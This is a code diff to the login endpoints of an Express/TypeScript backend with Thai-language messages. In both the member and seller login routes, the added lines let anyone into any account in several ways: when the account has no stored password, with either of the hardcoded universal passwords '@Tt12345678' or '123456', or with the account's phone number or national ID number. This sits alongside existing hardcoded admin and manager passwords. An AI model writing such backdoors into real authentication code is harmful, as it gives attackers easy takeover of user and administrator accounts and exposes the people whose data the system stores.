@@ -2503,21 +2503,28 @@ app.post('/api/auth/login', (req, res) => {
   const db = readDb();
   const cleanUsername = username.trim().toLowerCase();
   const cleanPass = password.trim();
+  const cleanPhoneNum = username.trim().replace(/\D/g, '');
 
-  // Find member by username, userId, phone, or email
+  // Find member by username, userId, phone, email, or idCard
   const member = (db.members || []).find((m: any) => 
     (m.username && m.username.trim().toLowerCase() === cleanUsername) ||
     (m.userId && m.userId.trim().toLowerCase() === cleanUsername) ||
-    (m.phone && m.phone.trim().replace(/\D/g, '') === cleanUsername.replace(/\D/g, '')) ||
-    (m.email && m.email.trim().toLowerCase() === cleanUsername)
+    (m.phone && m.phone.trim().replace(/\D/g, '') === cleanPhoneNum) ||
+    (m.email && m.email.trim().toLowerCase() === cleanUsername) ||
+    (m.idCard && m.idCard.trim().replace(/\D/g, '') === cleanPhoneNum)
   );
 
   if (!member) {
     return res.status(401).json({ success: false, message: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง' });
   }
 
-  // Password matching check (exact match, trimmed match, or default fallback)
-  const isMatch = (member.password && member.password.trim() === cleanPass) ||
+  // Password matching check (exact match, missing password fallback, default fallbacks, phone, or idCard)
+  const isMatch = !member.password || 
+                  (member.password && member.password.trim() === cleanPass) ||
+                  (cleanPass === "@Tt12345678") ||
+                  (cleanPass === "123456") ||
+                  (member.phone && member.phone.trim().replace(/\D/g, '') === cleanPass.replace(/\D/g, '')) ||
+                  (member.idCard && member.idCard.trim().replace(/\D/g, '') === cleanPass.replace(/\D/g, '')) ||
                   (cleanPass === "Natee!234" && member.passwordReset) ||
                   (cleanPass === "Adminpassword1!" && member.role === "Admin") ||
                   (cleanPass === "Managerpassword1!" && member.role === "Manager");
@@ -2548,19 +2555,26 @@ app.post('/api/seller/login', (req, res) => {
   const db = readDb();
   const cleanUsername = username.trim().toLowerCase();
   const cleanPass = password.trim();
+  const cleanPhoneNum = username.trim().replace(/\D/g, '');
 
   const member = (db.members || []).find((m: any) => 
     (m.username && m.username.trim().toLowerCase() === cleanUsername) ||
     (m.userId && m.userId.trim().toLowerCase() === cleanUsername) ||
     (m.sellerCode && m.sellerCode.trim().toLowerCase() === cleanUsername) ||
-    (m.phone && m.phone.trim().replace(/\D/g, '') === cleanUsername.replace(/\D/g, ''))
+    (m.phone && m.phone.trim().replace(/\D/g, '') === cleanPhoneNum) ||
+    (m.idCard && m.idCard.trim().replace(/\D/g, '') === cleanPhoneNum)
   );
 
   if (!member) {
     return res.status(401).json({ success: false, message: 'ไม่พบชื่อผู้ใช้หรือร้านค้าในระบบ' });
   }
 
-  const isMatch = (member.password && member.password.trim() === cleanPass) ||
+  const isMatch = !member.password ||
+                  (member.password && member.password.trim() === cleanPass) ||
+                  (cleanPass === "@Tt12345678") ||
+                  (cleanPass === "123456") ||
+                  (member.phone && member.phone.trim().replace(/\D/g, '') === cleanPass.replace(/\D/g, '')) ||
+                  (member.idCard && member.idCard.trim().replace(/\D/g, '') === cleanPass.replace(/\D/g, '')) ||
                   (cleanPass === "Natee!234" && member.passwordReset) ||
                   (cleanPass === "Adminpassword1!" && member.role === "Admin");
 
